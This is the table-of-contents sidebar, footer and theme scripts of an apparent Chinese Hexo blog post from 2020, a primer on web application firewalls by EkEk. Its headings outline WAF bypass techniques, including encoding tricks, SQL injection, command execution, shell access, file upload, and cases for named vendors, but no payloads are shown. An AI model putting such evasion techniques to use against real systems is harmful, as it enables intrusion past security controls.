+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-WAF概念"><span class="nav-text">0x00 WAF概念</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-WAF架构"><span class="nav-text">0x01 WAF架构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#串联"><span class="nav-text">串联</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#旁路"><span class="nav-text">旁路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#灵活组合"><span class="nav-text">灵活组合</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-WAF类型"><span class="nav-text">0x02 WAF类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产品形态划分"><span class="nav-text">产品形态划分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-硬件WAF"><span class="nav-text">1. 硬件WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-软件WAF"><span class="nav-text">2. 软件WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-云WAF"><span class="nav-text">3. 云WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-代码WAF"><span class="nav-text">4. 代码WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-RASP"><span class="nav-text">5. RASP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#部署位置划分"><span class="nav-text">部署位置划分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-嵌入式"><span class="nav-text">1. 嵌入式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-非嵌入式"><span class="nav-text">2. 非嵌入式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过风险"><span class="nav-text">绕过风险</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-拦截原理"><span class="nav-text">0x03 拦截原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基于正则匹配"><span class="nav-text">基于正则匹配</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于语义分析"><span class="nav-text">基于语义分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于机器学习"><span class="nav-text">基于机器学习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#语义-机器学习"><span class="nav-text">语义+机器学习</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-绕过维度"><span class="nav-text">0x04 绕过维度</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、架构层面"><span class="nav-text">一、架构层面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-串联"><span class="nav-text">1. 串联</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-旁路"><span class="nav-text">2. 旁路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、协议-中间件层面"><span class="nav-text">二、协议/中间件层面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Keep-alive-Pipelining"><span class="nav-text">1. Keep-alive+Pipelining</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-分块传输"><span class="nav-text">2. 分块传输</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#正常分块"><span class="nav-text">正常分块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#畸形分块"><span class="nav-text">畸形分块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分块欺骗"><span class="nav-text">分块欺骗</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Content-Type编码"><span class="nav-text">3. Content-Type编码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#正常协议"><span class="nav-text">正常协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#结合分块传输"><span class="nav-text">结合分块传输</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#畸形协议"><span class="nav-text">畸形协议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-SSL加密算法不支持"><span class="nav-text">4. SSL加密算法不支持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-报错绕过"><span class="nav-text">5. 报错绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#xxx-as-GET"><span class="nav-text">xxx as GET</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TAB-as-SPACE"><span class="nav-text">TAB as SPACE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参数空格"><span class="nav-text">参数空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GET-POST"><span class="nav-text">GET+POST</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Charset编码"><span class="nav-text">6. Charset编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-传输层"><span class="nav-text">7. 传输层</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-本段总结"><span class="nav-text">8. 本段总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、资源限制层面"><span class="nav-text">三、资源限制层面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-参数溢出"><span class="nav-text">1. 参数溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-超长字符串"><span class="nav-text">2. 超长字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-超长注释"><span class="nav-text">3. 超长注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-缓冲区溢出"><span class="nav-text">4. 缓冲区溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Dos攻击【不建议】"><span class="nav-text">5. Dos攻击【不建议】</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、编码层面"><span class="nav-text">四、编码层面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-base64、URL编码"><span class="nav-text">1. base64、URL编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Unicode编码"><span class="nav-text">2. Unicode编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-实体化编码"><span class="nav-text">3. 实体化编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-八进制"><span class="nav-text">4. 八进制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、白名单策略"><span class="nav-text">五、白名单策略</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-IP白名单"><span class="nav-text">1. IP白名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-HOST白名单"><span class="nav-text">2. HOST白名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-路径白名单"><span class="nav-text">3. 路径白名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-静态资源白名单"><span class="nav-text">4. 静态资源白名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-搜索引擎爬虫白名单"><span class="nav-text">5. 搜索引擎爬虫白名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-其他特征的数据"><span class="nav-text">6. 其他特征的数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、输出层面"><span class="nav-text">六、输出层面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-OOB"><span class="nav-text">1. OOB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Range"><span class="nav-text">2. Range</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#七、应用-编程语言-数据库-系统"><span class="nav-text">七、应用(编程语言/数据库)/系统</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-SQLi"><span class="nav-text">1. SQLi</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）MySql特性"><span class="nav-text">（1）MySql特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）由点及线"><span class="nav-text">（2）由点及线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（3）容器特性"><span class="nav-text">（3）容器特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（4）检测注入点"><span class="nav-text">（4）检测注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（5）自动化思路"><span class="nav-text">（5）自动化思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（6）规则对抗经验"><span class="nav-text">（6）规则对抗经验</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-XXE"><span class="nav-text">2. XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）实体化编码"><span class="nav-text">（1）实体化编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-命令执行"><span class="nav-text">3. 命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）空格绕过"><span class="nav-text">（1）空格绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）关键字绕过"><span class="nav-text">（2）关键字绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（3）获得shell"><span class="nav-text">（3）获得shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（4）转换函数绕过"><span class="nav-text">（4）转换函数绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-代码执行"><span class="nav-text">4. 代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）PHP"><span class="nav-text">（1）PHP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-文件上传"><span class="nav-text">5. 文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）重复参数污染"><span class="nav-text">（1）重复参数污染</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）换行绕过"><span class="nav-text">（2）换行绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（3）遗漏文件名"><span class="nav-text">（3）遗漏文件名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（4）未解析所有文件"><span class="nav-text">（4）未解析所有文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（5）文件名解析兼容性"><span class="nav-text">（5）文件名解析兼容性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-文件内容检测"><span class="nav-text">(6)文件内容检测</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-路径限制"><span class="nav-text">6. 路径限制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）后台访问限制"><span class="nav-text">（1）后台访问限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）针对路径匹配"><span class="nav-text">（2）针对路径匹配</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（3）相对路径绕过"><span class="nav-text">（3）相对路径绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（4）绝对路径绕过"><span class="nav-text">（4）绝对路径绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-XSS"><span class="nav-text">7. XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-第三方组件"><span class="nav-text">8. 第三方组件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）PCRE"><span class="nav-text">（1）PCRE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）ISAPI"><span class="nav-text">（2）ISAPI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（3）Libinjection"><span class="nav-text">（3）Libinjection</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#八、Google-Dorks-Approach"><span class="nav-text">八、Google Dorks Approach</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-CASE"><span class="nav-text">0x05 CASE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#零、使用说明"><span class="nav-text">零、使用说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一、云WAF"><span class="nav-text">一、云WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-阿里云"><span class="nav-text">1. 阿里云</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-腾讯云"><span class="nav-text">2. 腾讯云</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-百度云-Cloudflare"><span class="nav-text">3. 百度云/Cloudflare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-创宇盾"><span class="nav-text">4. 创宇盾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-京东云"><span class="nav-text">5. 京东云</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-奇安信"><span class="nav-text">6. 奇安信</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、软WAF"><span class="nav-text">二、软WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-宝塔-Nginx版"><span class="nav-text">1. 宝塔(Nginx版)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-宝塔-Apache版"><span class="nav-text">2. 宝塔(Apache版)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-安全狗"><span class="nav-text">3. 安全狗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-云锁"><span class="nav-text">4. 云锁</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-雷池"><span class="nav-text">5. 雷池</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Modsecurity"><span class="nav-text">6. Modsecurity</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、硬件WAF"><span class="nav-text">三、硬件WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-深信服"><span class="nav-text">1. 深信服</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-奇安信"><span class="nav-text">2. 奇安信</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-天融信"><span class="nav-text">3. 天融信</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-绿盟"><span class="nav-text">4. 绿盟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-安恒信息"><span class="nav-text">5. 安恒信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-启明星辰"><span class="nav-text">6. 启明星辰</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-WAF为什么可以绕过"><span class="nav-text">0x06 WAF为什么可以绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07-总结"><span class="nav-text">0x07 总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x08-参考"><span class="nav-text">0x08 参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EkEk</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://jeremyekek-github-io.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://jeremyekek.github.io/2020/05/20/WAF普及篇/';
+          this.page.identifier = '2020/05/20/WAF普及篇/';
+          this.page.title = 'WAF普及篇';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://jeremyekek-github-io.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
